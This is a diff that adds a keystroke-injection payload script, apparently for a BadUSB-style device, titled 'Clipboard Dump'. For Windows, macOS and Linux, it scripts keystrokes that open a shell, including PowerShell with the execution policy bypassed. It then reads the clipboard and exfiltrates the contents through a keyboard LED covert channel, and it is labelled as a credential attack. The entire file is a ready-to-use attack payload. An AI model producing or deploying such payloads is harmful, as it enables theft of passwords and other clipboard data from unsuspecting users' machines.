@@ -1,0 +1,26 @@
+NAME Clipboard Dump
+DESCRIPTION Exfiltrates clipboard contents via LED channel
+CATEGORY credential
+PLATFORMS WIN,MAC,LINUX
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass
+ENTER
+DELAY 1200
+EXFIL Get-Clipboard
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+EXFIL pbpaste
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+EXFIL xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null
